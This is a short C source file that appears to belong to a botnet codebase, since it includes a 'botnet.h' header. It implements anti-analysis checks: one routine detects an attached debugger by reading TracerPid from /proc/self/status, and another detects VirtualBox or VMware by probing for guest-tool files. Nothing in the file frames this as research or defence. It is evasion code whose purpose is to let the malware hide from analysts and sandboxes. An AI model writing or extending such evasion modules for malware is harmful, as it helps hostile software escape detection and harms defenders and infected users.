#include "../../include/botnet.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

// Detects if a debugger is attached by checking /proc/self/status
int check_debugger() {
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp == NULL) {
        return 0; // Cannot open status file, assume no debugger
    }

    char line[256];
    int tracer_pid = 0;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            tracer_pid = atoi(line + 10);
            break;
        }
    }

    fclose(fp);

    return tracer_pid != 0;
}

// Detects if running inside a Virtual Machine
int check_virtualization() {
    // Check for files that are common in virtualized environments
    if (access("/usr/bin/VBoxControl", F_OK) != -1 || 
        access("/usr/bin/VBoxService", F_OK) != -1 ||
        access("/dev/vboxguest", F_OK) != -1) {
        printf("[*] Anti-VM: VirtualBox detected.\n");
        return 1;
    }

    if (access("/usr/bin/vmtoolsd", F_OK) != -1) {
        printf("[*] Anti-VM: VMware detected.\n");
        return 1;
    }


    // More advanced checks could inspect CPUID, MAC addresses, etc.

    return 0; // Assume not a VM
}
